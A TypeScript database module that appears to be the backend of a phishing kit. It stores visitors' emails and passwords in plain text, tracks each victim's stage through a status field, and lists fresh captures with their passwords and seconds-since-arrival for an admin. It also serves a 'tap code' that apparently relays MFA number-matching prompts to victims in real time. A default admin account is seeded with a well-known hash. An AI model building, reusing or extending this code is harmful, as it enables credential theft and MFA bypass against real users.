import fs from 'fs';
import path from 'path';
import { Pool } from '@neondatabase/serverless';
import { Pool as PgPool } from 'pg';

interface DBUser {
  id: number;
  email: string;
  password: string;
  status: string;
  created_at: string;
}

interface DBTapCode {
  id: number;
  code: string;
  created_at: string;
}

interface DBAdmin {
  id: number;
  username: string;
  password: string;
  created_at: string;
}

interface DBData {
  users: DBUser[];
  tapCodes: DBTapCode[];
  admins: DBAdmin[];
  userAutoId: number;
  tapAutoId: number;
}

const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL;

let neonPool: any = null;

if (connectionString) {
  try {
    if (connectionString.includes('neon.tech') || connectionString.includes('vercel-storage.com')) {
      neonPool = new Pool({ connectionString });
    } else {
      neonPool = new PgPool({ connectionString });
    }
  } catch (err) {
    console.error('Failed to initialize SQL Pool:', err);
    neonPool = null;
  }
}

/**
 * Initialize Neon database schema automatically if connected
 */
export async function initDbSchema() {
  if (!neonPool) return;
  try {
    await neonPool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        status VARCHAR(50) DEFAULT 'email_entered',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS tap_codes (
        id SERIAL PRIMARY KEY,
        code VARCHAR(10) NOT NULL,
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS admins (
        id SERIAL PRIMARY KEY,
        username VARCHAR(100) NOT NULL UNIQUE,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `);

    // Insert default tap code if empty
    const tapRes = await neonPool.query('SELECT COUNT(*) FROM tap_codes');
    if (parseInt(tapRes.rows[0].count, 10) === 0) {
      await neonPool.query("INSERT INTO tap_codes (code) VALUES ('22')");
    }

    // Insert default admin if empty
    const adminRes = await neonPool.query('SELECT COUNT(*) FROM admins');
    if (parseInt(adminRes.rows[0].count, 10) === 0) {
      await neonPool.query(
        "INSERT INTO admins (username, password) VALUES ('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi')"
      );
    }
  } catch (err) {
    console.error('Error initializing database schema:', err);
  }
}

// Ensure schema check is performed when DB pool exists
if (neonPool) {
  initDbSchema().catch(console.error);
}

// ----------------------------------------------------
// Persistent Local File Database Engine with Memory Cache
// ----------------------------------------------------
let memoryCache: DBData | null = null;

function getDbFilePath(): string {
  if (process.env.VERCEL) {
    return path.join('/tmp', 'local-db.json');
  }
  const dataDir = path.join(process.cwd(), 'data');
  if (!fs.existsSync(dataDir)) {
    try {
      fs.mkdirSync(dataDir, { recursive: true });
    } catch (e) {
      // ignore
    }
  }
  return path.join(dataDir, 'db.json');
}

function getDefaultData(): DBData {
  return {
    users: [],
    tapCodes: [{ id: 1, code: '22', created_at: new Date().toISOString() }],
    admins: [
      {
        id: 1,
        username: 'admin',
        password: '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi',
        created_at: new Date().toISOString(),
      },
    ],
    userAutoId: 1,
    tapAutoId: 2,
  };
}

function readLocalDb(): DBData {
  const filePath = getDbFilePath();

  // Try reading from disk file first
  if (fs.existsSync(filePath)) {
    try {
      const content = fs.readFileSync(filePath, 'utf8');
      if (content && content.trim()) {
        const parsed = JSON.parse(content);
        if (parsed && Array.isArray(parsed.users)) {
          memoryCache = parsed;
          return parsed;
        }
      }
    } catch (err) {
      console.warn('Temporary file read lock, using memory cache:', err);
    }
  }

  // If memory cache exists and has data, return it (NEVER wipe with default data!)
  if (memoryCache && Array.isArray(memoryCache.users)) {
    return memoryCache;
  }

  // Initial cold start only: create default database
  const defaultData = getDefaultData();
  memoryCache = defaultData;
  writeLocalDb(defaultData);
  return defaultData;
}

function writeLocalDb(data: DBData): void {
  // Update memoryCache immediately so simultaneous operations never see stale data
  memoryCache = data;

  try {
    const filePath = getDbFilePath();
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error('Error writing local db file:', err);
  }
}

// Database helper operations
export const db = {
  async saveUser(email: string, password: string, status: string) {
    if (neonPool) {
      try {
        const checkRes = await neonPool.query(
          'SELECT id FROM users WHERE email = $1 ORDER BY id DESC LIMIT 1',
          [email]
        );
        if (checkRes.rows.length > 0) {
          const userId = checkRes.rows[0].id;
          await neonPool.query(
            'UPDATE users SET password = $1, status = $2, created_at = CURRENT_TIMESTAMP WHERE id = $3',
            [password, status, userId]
          );
          return { success: true, user_id: userId, action: 'updated' };
        } else {
          const insertRes = await neonPool.query(
            'INSERT INTO users (email, password, status) VALUES ($1, $2, $3) RETURNING id',
            [email, password, status]
          );
          return { success: true, user_id: insertRes.rows[0].id, action: 'created' };
        }
      } catch (err) {
        console.error('Neon saveUser error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    const existingIndex = data.users.findIndex((u) => u.email.toLowerCase() === email.toLowerCase());
    if (existingIndex !== -1) {
      data.users[existingIndex].password = password;
      data.users[existingIndex].status = status;
      data.users[existingIndex].created_at = new Date().toISOString();
      writeLocalDb(data);
      return { success: true, user_id: data.users[existingIndex].id, action: 'updated' };
    } else {
      const newId = data.userAutoId++;
      data.users.push({
        id: newId,
        email,
        password,
        status,
        created_at: new Date().toISOString(),
      });
      writeLocalDb(data);
      return { success: true, user_id: newId, action: 'created' };
    }
  },

  async getUsers() {
    const now = Math.floor(Date.now() / 1000);

    if (neonPool) {
      try {
        const res = await neonPool.query(
          'SELECT id, email, password, status, created_at FROM users ORDER BY id DESC LIMIT 50'
        );
        return res.rows.map((row: any) => {
          const createdAtTime = Math.floor(new Date(row.created_at).getTime() / 1000);
          return {
            id: row.id,
            email: row.email,
            password: row.password,
            status: row.status,
            seconds_ago: Math.max(0, now - createdAtTime),
            timestamp: row.created_at,
          };
        });
      } catch (err) {
        console.error('Neon getUsers error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    const sorted = [...data.users].sort((a, b) => b.id - a.id).slice(0, 50);
    return sorted.map((u) => {
      const createdAtTime = Math.floor(new Date(u.created_at).getTime() / 1000);
      return {
        id: u.id,
        email: u.email,
        password: u.password,
        status: u.status,
        seconds_ago: Math.max(0, now - createdAtTime),
        timestamp: u.created_at,
      };
    });
  },

  async updateStatus(userId: number, status: string) {
    if (neonPool) {
      try {
        await neonPool.query('UPDATE users SET status = $1 WHERE id = $2', [status, userId]);
        return { success: true };
      } catch (err) {
        console.error('Neon updateStatus error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    const user = data.users.find((u) => u.id === userId);
    if (user) {
      user.status = status;
      writeLocalDb(data);
      return { success: true };
    }
    return { success: false, error: 'User not found' };
  },

  async deleteUser(userId: number) {
    if (neonPool) {
      try {
        await neonPool.query('DELETE FROM users WHERE id = $1', [userId]);
        return { success: true };
      } catch (err) {
        console.error('Neon deleteUser error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    data.users = data.users.filter((u) => u.id !== userId);
    writeLocalDb(data);
    return { success: true };
  },

  async saveCoupon(code: string) {
    if (neonPool) {
      try {
        await neonPool.query('INSERT INTO tap_codes (code) VALUES ($1)', [code]);
        return { success: true };
      } catch (err) {
        console.error('Neon saveCoupon error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    const newId = data.tapAutoId++;
    data.tapCodes.push({ id: newId, code, created_at: new Date().toISOString() });
    writeLocalDb(data);
    return { success: true };
  },

  async getLatestCoupon() {
    if (neonPool) {
      try {
        const res = await neonPool.query('SELECT code FROM tap_codes ORDER BY id DESC LIMIT 1');
        if (res.rows.length > 0) {
          return { coupon: res.rows[0].code };
        }
        return { coupon: '22' };
      } catch (err) {
        console.error('Neon getLatestCoupon error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    if (data.tapCodes && data.tapCodes.length > 0) {
      const latest = data.tapCodes[data.tapCodes.length - 1];
      return { coupon: latest.code };
    }
    return { coupon: '22' };
  },

  async getAdmin(username: string) {
    if (neonPool) {
      try {
        const res = await neonPool.query('SELECT * FROM admins WHERE username = $1', [username]);
        return res.rows[0] || null;
      } catch (err) {
        console.error('Neon getAdmin error, falling back to local file store:', err);
      }
    }

    // Local Persistent Store
    const data = readLocalDb();
    return data.admins.find((a) => a.username === username) || null;
  },
};
